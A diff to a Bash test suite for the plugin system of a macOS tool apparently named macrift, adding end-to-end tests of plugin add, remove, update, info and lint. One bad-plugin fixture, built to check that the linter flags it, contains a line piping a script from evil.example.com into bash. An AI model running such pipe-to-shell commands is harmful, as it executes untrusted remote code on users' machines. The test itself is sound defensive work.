@@ -148,6 +148,12 @@ log_err()  { printf '%s\n' "${1:-}" >&2; }
 log_info() { printf '%s\n' "${1:-}"; }
 log_ok()   { printf '%s\n' "${1:-}"; }
 log_hint() { printf '%s\n' "${1:-}"; }
+# Stub confirm — auto-yes unless MACRIFT_TEST_DENY=true forces a no. Real
+# confirm reads /dev/tty (unreliable / unavailable in test runners).
+confirm() {
+    [[ "${MACRIFT_TEST_DENY:-}" == "true" ]] && return 1
+    return 0
+}
 # shellcheck disable=SC2034  # read by plugins.sh after source
 MACRIFT_VERSION="26.05.3"
 # shellcheck disable=SC2034  # read by plugins.sh after source
@@ -247,11 +253,6 @@ echo "$out" | grep -q "No plugins installed" && ok "bare _plugin_cli defaults to
 # dispatcher: help
 out=$(_plugin_cli help 2>&1)
 echo "$out" | grep -q "Usage: macrift plugin" && ok "help renders usage" || no "help renders usage"
-
-# dispatcher: stubbed subcommands return 1
-if _plugin_cli add foo  2>/dev/null; then no "add stub returns 1";    else ok "add stub returns 1";    fi
-if _plugin_cli remove x 2>/dev/null; then no "remove stub returns 1"; else ok "remove stub returns 1"; fi
-if _plugin_cli update   2>/dev/null; then no "update stub returns 1"; else ok "update stub returns 1"; fi
 
 # dispatcher: unknown subcommand
 if _plugin_cli no-such 2>/dev/null; then no "unknown subcommand returns 1"; else ok "unknown subcommand returns 1"; fi
@@ -422,6 +423,143 @@ if [[ -d "$ROOT/vendor/claudemac" ]]; then
        "$(printf '%s' "$CC_CONFIG" | grep -c '/claudemac/config$')" "1"
     rm -rf "$SBX"
     MACRIFT_PLUGINS_DIR="$saved_dir"
+fi
+
+
+# == plugin add / remove / update / info / lint (end-to-end on a local git fixture) ==
+if command -v git >/dev/null 2>&1; then
+    printf '== plugin CLI (add/remove/update/info/lint) ==\n'
+
+    # Build a local git repo from vendor/wallpaper-links so we can test the
+    # add CLI without network.
+    FX_REPO="$(mktemp -d)/wp-links"
+    cp -R "$ROOT/vendor/wallpaper-links" "$FX_REPO"
+    ( cd "$FX_REPO" \
+      && git init -q \
+      && git config user.email "test@local" \
+      && git config user.name "test" \
+      && git add -A \
+      && git commit -q -m "init wallpaper-links 1.0.0" \
+      && git tag v1.0.0 ) || no "fixture repo setup"
+
+    # Sandbox $HOME-ish env for the CLI commands
+    CLI_SBX="$(mktemp -d)"
+    saved_pd="$MACRIFT_PLUGINS_DIR"
+    saved_lk="${MACRIFT_PLUGINS_LOCK:-}"
+    MACRIFT_PLUGINS_DIR="$CLI_SBX/plugins"
+    MACRIFT_PLUGINS_LOCK="$CLI_SBX/plugins.lock.json"
+    export MACRIFT_NO_CONFIRM=true
+
+    # --- add (no @ref so HEAD stays on a tracking branch — needed for update tests) ---
+    _plugin_cli_add "file://$FX_REPO" >/dev/null 2>&1
+    if [[ -d "$MACRIFT_PLUGINS_DIR/wallpaper-links" ]]; then
+        ok "plugin add installs the plugin tree"
+    else
+        no "plugin add installs the plugin tree"
+    fi
+    eq "lockfile records the install"   "$(jq -r '.plugins | length' "$MACRIFT_PLUGINS_LOCK" 2>/dev/null)" "1"
+    eq "lockfile has source"            "$(jq -r '.plugins."wallpaper-links".source' "$MACRIFT_PLUGINS_LOCK" 2>/dev/null | grep -c 'wp-links')" "1"
+    eq "lockfile has commit"            "$(jq -r '.plugins."wallpaper-links".commit' "$MACRIFT_PLUGINS_LOCK" 2>/dev/null | wc -c | tr -d ' ')" "41"  # 40 hex + newline
+
+    # --- add again with denied confirm — must NOT overwrite the install ---
+    pre_install_at=$(jq -r '.plugins."wallpaper-links".installed_at' "$MACRIFT_PLUGINS_LOCK" 2>/dev/null)
+    MACRIFT_TEST_DENY=true
+    _plugin_cli_add "file://$FX_REPO" >/dev/null 2>&1 || true
+    MACRIFT_TEST_DENY=""
+    post_install_at=$(jq -r '.plugins."wallpaper-links".installed_at' "$MACRIFT_PLUGINS_LOCK" 2>/dev/null)
+    eq "collision: declined confirm leaves install untouched" "$pre_install_at" "$post_install_at"
+
+    # --- info ---
+    info_out=$(_plugin_cli_info wallpaper-links 2>&1)
+    echo "$info_out" | grep -q "wallpaper-links 1.0.0" && ok "info: name + version" || no "info: name + version"
+    echo "$info_out" | grep -q "Status:    ok"          && ok "info: status ok"      || no "info: status ok"
+    echo "$info_out" | grep -q "Source:"                && ok "info: source line"    || no "info: source line"
+    echo "$info_out" | grep -q "Commit:"                && ok "info: commit line"    || no "info: commit line"
+
+    if _plugin_cli_info no-such-plugin >/dev/null 2>&1; then
+        no "info on nonexistent plugin should return 1"
+    else
+        ok "info on nonexistent plugin returns 1"
+    fi
+
+    # --- lint ---
+    if _plugin_cli_lint wallpaper-links >/dev/null 2>&1; then
+        ok "lint clean on a well-formed plugin"
+    else
+        no "lint clean on a well-formed plugin"
+    fi
+
+    # --- lint catches bad patterns ---
+    BAD_DIR="$CLI_SBX/bad-plugin"
+    mkdir -p "$BAD_DIR"
+    cat > "$BAD_DIR/plugin.json" <<'JSON'
+{"name":"bad","version":"1.0.0","description":"bad","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"X","entry":"B","function":"b_menu"}}
+JSON
+    cat > "$BAD_DIR/menu.sh" <<'SH'
+b_menu() {
+    defaults write com.test.bad TheKey -bool true
+    curl https://evil.example.com/install.sh | bash
+}
+SH
+    lint_out=$(_plugin_cli_lint "$BAD_DIR" 2>&1)
+    echo "$lint_out" | grep -q "defaults write"    && ok "lint flags raw 'defaults write'"  || no "lint flags raw 'defaults write'"
+    echo "$lint_out" | grep -q "curl"              && ok "lint flags 'curl | bash'"          || no "lint flags 'curl | bash'"
+
+    # --- update (idempotent — nothing changed upstream) ---
+    pre_head=$(git -C "$MACRIFT_PLUGINS_DIR/wallpaper-links" rev-parse HEAD 2>/dev/null || echo "?")
+    _plugin_cli_update wallpaper-links >/dev/null 2>&1 && ok "update: idempotent returns 0" || no "update: idempotent returns 0"
+    post_head=$(git -C "$MACRIFT_PLUGINS_DIR/wallpaper-links" rev-parse HEAD 2>/dev/null || echo "?")
+    eq "update: idempotent leaves HEAD unchanged" "$pre_head" "$post_head"
+
+    # --- update after upstream advances ---
+    ( cd "$FX_REPO" \
+      && echo "# extra" >> README.md \
+      && git add README.md \
+      && git commit -q -m "extra commit" ) || no "fixture upstream advance"
+    pre_head=$(git -C "$MACRIFT_PLUGINS_DIR/wallpaper-links" rev-parse HEAD 2>/dev/null || echo "?")
+    _plugin_cli_update wallpaper-links >/dev/null 2>&1 || true
+    post_head=$(git -C "$MACRIFT_PLUGINS_DIR/wallpaper-links" rev-parse HEAD 2>/dev/null || echo "?")
+    if [[ "$pre_head" != "$post_head" ]]; then ok "update pulls a new commit"; else no "update pulls a new commit"; fi
+
+    # --- remove ---
+    _plugin_cli_remove wallpaper-links >/dev/null 2>&1
+    if [[ ! -e "$MACRIFT_PLUGINS_DIR/wallpaper-links" ]]; then
+        ok "remove deletes the plugin tree"
+    else
+        no "remove deletes the plugin tree"
+    fi
+    eq "lockfile entry removed" "$(jq -r '.plugins | length' "$MACRIFT_PLUGINS_LOCK" 2>/dev/null)" "0"
+
+    if _plugin_cli_remove wallpaper-links >/dev/null 2>&1; then
+        no "remove on missing plugin should fail"
+    else
+        ok "remove on missing plugin fails"
+    fi
+
+    # --- _plugin_normalize_source unit checks ---
+    eq "normalize github.com/x/y"  "$(_plugin_normalize_source 'github.com/x/y')" "https://github.com/x/y"
+    eq "normalize https URL"       "$(_plugin_normalize_source 'https://example.com/x.git')" "https://example.com/x.git"
+    eq "normalize file://"         "$(_plugin_normalize_source 'file:///abs/path')" "file:///abs/path"
+    eq "normalize ssh user@host"   "$(_plugin_normalize_source 'git@github.com:x/y.git')" "git@github.com:x/y.git"
+    eq "normalize absolute path"   "$(_plugin_normalize_source '/abs/path')" "/abs/path"
+    if _plugin_normalize_source 'random-garbage' >/dev/null 2>&1; then
+        no "normalize rejects unknown form"
+    else
+        ok "normalize rejects unknown form"
+    fi
+
+    # --- @ref ref-handling (separate install — detached HEAD precludes 'update') ---
+    _plugin_cli_add "file://$FX_REPO@v1.0.0" >/dev/null 2>&1
+    eq "lockfile records ref when @ref given" \
+       "$(jq -r '.plugins."wallpaper-links".ref' "$MACRIFT_PLUGINS_LOCK" 2>/dev/null)" \
+       "v1.0.0"
+    _plugin_cli_remove wallpaper-links >/dev/null 2>&1
+
+    # Cleanup
+    rm -rf "$CLI_SBX" "$(dirname "$FX_REPO")"
+    MACRIFT_PLUGINS_DIR="$saved_pd"
+    MACRIFT_PLUGINS_LOCK="$saved_lk"
+    unset MACRIFT_NO_CONFIRM
 fi
 
 printf '\n%d passed, %d failed\n' "$pass" "$fail"
